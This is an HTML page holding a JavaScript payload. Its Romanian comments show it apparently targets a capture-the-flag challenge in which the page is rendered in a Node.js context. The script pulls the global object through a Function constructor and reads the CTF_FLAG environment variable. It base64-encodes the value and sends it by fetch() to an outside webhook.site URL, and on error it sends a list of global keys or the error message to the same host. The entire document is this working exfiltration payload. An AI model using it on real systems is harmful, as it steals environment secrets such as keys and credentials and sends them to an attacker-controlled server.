<!DOCTYPE html>
<html>
<body>
    <script>
        try {
            // Încercăm să accesăm variabilele globale prin funcția de captură a erorilor
            // Uneori 'process' este ascuns în contextul global, nu în 'window'
            var global = (new Function("return this")());
            var flag = global.process.env.CTF_FLAG;
            
            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?GATA=" + btoa(flag));
        } catch (e) {
            // Dacă dă eroare, cerem sistemului să ne arate TOT ce poate vedea în contextul Node
            var debug = "";
            try { 
                debug = Object.keys(Function("return this")()).join(","); 
            } catch(err) { debug = e.message; }
            
            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?DEBUG=" + btoa(debug));
        }
    </script>
</body>
</html>
